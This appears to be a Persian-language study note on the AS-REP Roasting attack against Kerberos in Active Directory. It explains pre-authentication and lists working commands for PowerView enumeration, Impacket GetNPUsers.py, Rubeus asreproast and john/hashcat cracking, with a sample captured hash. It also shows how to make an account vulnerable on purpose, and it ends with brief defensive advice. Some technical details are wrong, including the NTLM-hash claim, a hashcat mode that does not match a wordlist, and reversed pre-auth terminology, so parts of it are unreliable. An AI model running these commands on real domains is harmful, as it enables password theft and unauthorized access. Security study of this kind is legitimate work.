

---

# 🔥 AS-REP Roasting چیست؟

---

## 🎯 خلاصه سریع:

**AS-REP Roasting** یک تکنیک حمله به Kerberos هست که مهاجم می‌تونه **هش رمز عبور بعضی از کاربران دامنه رو بدون لاگین کردن یا نیاز به رمز، به‌دست بیاره** و بعداً اون هش رو **آفلاین کرک کنه** (مثلاً با Hashcat).

---

## 🧠 درک فنی‌تر:

وقتی کاربری بخواد با Kerberos وارد سیستم بشه، اول از همه یک پیام به نام **AS-REQ** (Authentication Service Request) به Domain Controller می‌فرسته.

حالا، اگه کاربر:

> **"Does not require Kerberos pre-authentication"** فعال داشته باشه  
> یعنی: گزینه‌ی `Do not require pre-authentication` در تنظیمات AD فعال باشه

اون‌وقت مهاجم می‌تونه بدون نیاز به پسورد، یک **AS-REQ جعلی** بفرسته، و در جواب، یک **AS-REP** (که حاوی هش رمز اون کاربره) دریافت کنه.

این هش شامل **قسمتی از رمز عبور رمزنگاری‌شده با کلید NTLM** کاربره.

---

## 📦 مراحل کلی حمله

1. 🎯 مهاجم لیست کاربرهایی رو جمع‌آوری می‌کنه که گزینه "pre-authentication required" ندارن  
    (مثلاً با PowerView: `Get-DomainUser -PreauthNotRequired`)
    
2. 📥 برای هر کاربر، یک درخواست AS-REQ به DC می‌فرسته
    
3. 📦 در جواب، هش `AS-REP` (که با پسورد کاربر رمز شده) دریافت می‌کنه
    
4. 🧨 حالا این هش رو با ابزارهایی مثل **Hashcat** یا **John The Ripper** کرک می‌کنه
    

---

## 🛠️ ابزارهای رایج برای AS-REP Roasting

| ابزار                        | کاربرد                           |
| ---------------------------- | -------------------------------- |
| **Rubeus**                   | دریافت هش‌ها از DC               |
| **Impacket’s GetNPUsers.py** | دریافت AS-REP از DC (بسیار رایج) |
| **PowerView**                | کشف کاربرهایی که Pre-auth ندارن  |
| **Hashcat**                  | کرک هش‌های AS-REP                |
| **John the Ripper**          | کرک هش‌های AS-REP                |

---

## 🎯 دستور عملی با Impacket

```bash
python3 GetNPUsers.py 'domain.local/' -no-pass -usersfile users.txt -format hashcat -dc-ip 192.168.1.10
```

✅ هش‌هایی به فرم `23$...` دریافت می‌کنی که قابل کرک هستن.

---

## 🧯 دفاع و شناسایی

| راهکار دفاعی                                       | توضیح                                     |
| -------------------------------------------------- | ----------------------------------------- |
| ❌ غیر فعال‌کردن `Do not require Kerberos pre-auth` | امن‌ترین راه                              |
| ✅ بررسی کاربران با این تنظیم                       | با PowerView یا ADUC                      |
| 🔍 مانیتورینگ AS-REQهای مشکوک                      | مخصوصاً برای کاربران معمولی               |
| SIEM                                               | هشدار در صورت دریافت AS-REP بدون pre-auth |

---

## 🧪 بررسی کاربران آسیب‌پذیر با PowerView

```powershell
Get-DomainUser -PreauthNotRequired
```

---

## 🔚 جمع‌بندی

|نکته|توضیح|
|---|---|
|حمله روی Kerberos هست؟|بله، دقیقا روی مرحله اول (AS-REQ / AS-REP)|
|رمز رو کرک می‌کنه؟|بله، هش رمز عبور رو گرفته و آفلاین کرک می‌کنه|
|برای حمله لازم نیست رمز داشته باشی؟|درست! فقط اسم کاربر|
|دفاع؟|غیر فعال‌کردن Pre-auth و مانیتورینگ لاگ‌ها|

---


---

## 🧠 از اول، دقیق و مرحله‌به‌مرحله: Kerberos چطور کار می‌کنه؟

وقتی یک کاربر می‌خواد به دامنه (Domain) لاگین کنه، باید یک **Ticket Granting Ticket (TGT)** از **KDC** بگیره. این کار با ارسال یک درخواست به نام **AS-REQ** انجام می‌شه.

اما KDC (یعنی همون Domain Controller) چطور مطمئن بشه که این درخواست از طرف صاحب واقعی اون نام کاربریه؟ اینجاست که **timestamp** وارد ماجرا می‌شه.

---

## ⏰ مرحله‌ی پیش‌احراز هویت (Pre-Authentication)

در حالت **عادی** (و امن)، مراحل به این صورته:

### ✅ ۱. کلاینت باید ثابت کنه که رمز عبور رو می‌دونه

1. کلاینت رمز عبورش رو وارد می‌کنه.
    
2. این رمز، تبدیل می‌شه به یک کلید تقویت‌شده (Encryption Key)، مثلاً با استفاده از الگوریتم AES.
    
3. حالا کلاینت یک **timestamp فعلی سیستم** رو می‌سازه (مثلاً: `2025-07-21T22:40`) و با **کلید رمز عبورش** اون رو رمزنگاری می‌کنه.
    
4. این اطلاعات به صورت AS-REQ برای KDC ارسال می‌شه.
    

```
AS-REQ = Encrypted(Timestamp, UserPasswordDerivedKey)
```

### ✅ ۲. KDC بررسی می‌کنه:

- KDC رمز عبور واقعی کاربر رو می‌دونه (توی دیتابیسش داره).
    
- با استفاده از اون رمز، تلاش می‌کنه **timestamp رمزنگاری‌شده رو رمزگشایی کنه**.
    
- اگه تونست، یعنی کاربر رمز درست وارد کرده و واقعیه.
    
- حالا KDC یک TGT می‌ده.
    

---

## ⚠️ اما اگر **Do not require pre-authentication** فعال باشه...

- کاربر دیگه نیازی نداره **timestamp رمزنگاری‌شده** بفرسته.
    
- فقط کافیه اسم کاربر رو به KDC بفرسته!
    
- KDC **مستقیماً** یک پاسخ AS-REP می‌فرسته که با رمز عبور کاربر رمز شده.
    

---

## 🚨 حالا آسیب‌پذیری کجاست؟ (AS-REP Roasting)

- مهاجم فقط اسم کاربری رو می‌دونه.
    
- درخواست می‌فرسته → KDC پاسخ رمزنگاری‌شده (AS-REP) می‌ده.
    
- مهاجم این پاسخ رو ذخیره می‌کنه (مثل یک هش).
    
- حالا با ابزارهایی مثل `hashcat` تلاش می‌کنه با brute-force کلید رو پیدا کنه ⇒ یعنی رمز عبور کاربر رو کشف کنه.
    

---

## 🎯 چرا timestamp مهمه؟

|ویژگی|وقتی pre-auth فعال باشه|وقتی pre-auth غیر فعال باشه|
|---|---|---|
|ارسال timestamp رمز شده|✔️ بله|❌ نه|
|KDC مطمئن می‌شه کاربر رمز درست زده|✔️ بله|❌ نه (خطرناک!)|
|امکان حمله AS-REP Roasting|❌ نه|✔️ بله|

---

## 📌 نتیجه:

- **timestamp** یک مدرک رمزنگاری‌شده از زمان فعلی هست که ثابت می‌کنه کاربر رمز عبور درست رو می‌دونه.
    
- حذفش یعنی در را برای حملات باز گذاشتن.
    

---

برای اینکه متوجه بشیم چه سیستم های در شبکه pre authentication فعال هستند باید اول بیایم و با ابزار هایی مانند powerview برسی کنیم این مورد رو پس در قدم اول با import کردن  ماژول powerview میایم دستور

```
Get-Domainuser | Where-Object {$_.UserAccountControl -like "*DONT_REQ_PREAUTH*"}
```


با استفاده از این دستور و ارگومان ها از ابزار powerview میتونیم ببینیم که چه user هایی pre authentication فعاله 


حالا که متوجه شدیم مثلا اکانتی داخل شبکه وجود دارد به اسم charon که  prequth فعاله حالا میایم با استفاده از ابزاری ماننده Rubeus.exe یک AS-REQ جعلی میفرستیم

```
.\Rubeus.exe asreproast /usr:charon /outfile:charon_hash.txt
```

و در نهایت میتونیم  با داشتن هش با ابزاری ماننده john the ripper یا hashcat بیایم و هش رو با روش هایی ماننده Brute-Force هش رو بشکونیم 

```
john.exe .\charon_hash.txt --format=krb5asrep --wordlist=c:\users\hacker\passwordlist.txt
```




✅ برای جلوگیری از این حمله، **pre-authentication را فعال کنیم (نه غیرفعال!)**
❌ اگه pre-auth **غیرفعال باشه**، امکان حمله فراهم می‌شه.

## 🔐 نقش Pre-Authentication چیه؟

وقتی **Pre-authentication فعال باشه**:

- کاربر قبل از گرفتن AS-REP، باید یک timestamp رمز شده با کلید خودش به KDC بفرسته
    
- اگر این رمزنگاری صحیح نباشه (یعنی کلید رو ندونیم)، KDC جواب نمی‌ده  
    🛡️ این باعث می‌شه **فقط کسی که رمز عبور کاربر رو داره** بتونه وارد مرحله بعدی بشه





==============================================================================================================================


![[Pasted image 20250923064729.png]]



```
.\Rubeus.exe asreproast
```

![[Pasted image 20250923064800.png]]


Crack 

```
hashcat -m18200 '$krb5asrep$23$spot@offense.local:3171EA207B3A6FDAEE52BA247C20362E$56FE7DC0CABA8CB7D3A02A140C612A917DF3343C01BCDAB0B669EFA15B29B2AEBBFED2B4F3368A897B833A6B95D5C2F1C2477121C8F5E005AA2A588C5AE72AADFCBF1AEDD8B7AC2F2E94E94CB101E27A2E9906E8646919815D90B4186367B6D5072AB9EDD0D7B85519FBE33997B3D3B378340E3F64CAA92595523B0AD8DC8E0ABE69DDA178D8BA487D3632A52BE7FF4E786F4C271172797DCBBDED86020405B014278D5556D8382A655A6DB1787DBE949B412756C43841C601CE5F21A36A0536CFED53C913C3620062FDF5B18259EA35DE2B90C403FBADD185C0F54B8D0249972903CA8FF5951A866FC70379B9DA' -a 3 /usr/share/wordlists/rockyou.txt
```


![[Pasted image 20250923064914.png]]



```powershell
# با حساب ادمین دامین
Set-ADUser -Identity "targetuser" -KerberosEncryptionType None -PreAuthentication $false
```

یا از طریق Active Directory Users and Computers:

1. کاربر را پیدا کنید.
2. Properties → Account tab
3. تیک "Do not require Kerberos preauthentication" را بزنید.


```
# با Impacket
GetNPUsers.py DOMAIN/targetuser -no-pass -dc-ip DC_IP
```

```powershell
Rubeus.exe asreproast /user:targetuser /format:hashcat
```


---

در عمل یعنی چی؟در پروتکل Kerberos (که برای احراظ هویت در Active Directory استفاده می‌شه)، مراحل عادی احراز هویت اینه:

1. کاربر می‌گه: "من amin هستم، یه TGT بهم بده."
2. KDC می‌گه: "اول ثابت کن واقعاً amin هستی!" → pre-authentication (مثلاً با رمز عبور یا timestamp رمز شده)
3. کاربر اطلاعات رمز شده رو می‌فرسته → KDC چک می‌کنه → TGT می‌ده.

---

وقتی "Do not require Kerberos preauthentication" فعال باشه:

- مرحله 2 و 3 حذف می‌شه.
- هر کسی می‌تونه بدون رمز عبور درخواست TGT کنه.
- KDC یک AS-REP (پاسخ) می‌فرسته که شامل هش NTLM (یا Kerberos hash) کاربر است، رمز شده با کلید کاربر (که از رمز عبور میاد).

---

نتیجه؟ → AS-REP Roasting ممکن میشه!هکر (یا تستر نفوذ) می‌تونه:

1. درخواست TGT بده (بدون رمز).
2. AS-REP رو بگیره.
3. هش رو استخراج کنه.
4. آفلاین با ابزارهایی مثل Hashcat سعی کنه رمز عبور رو کرک کنه.

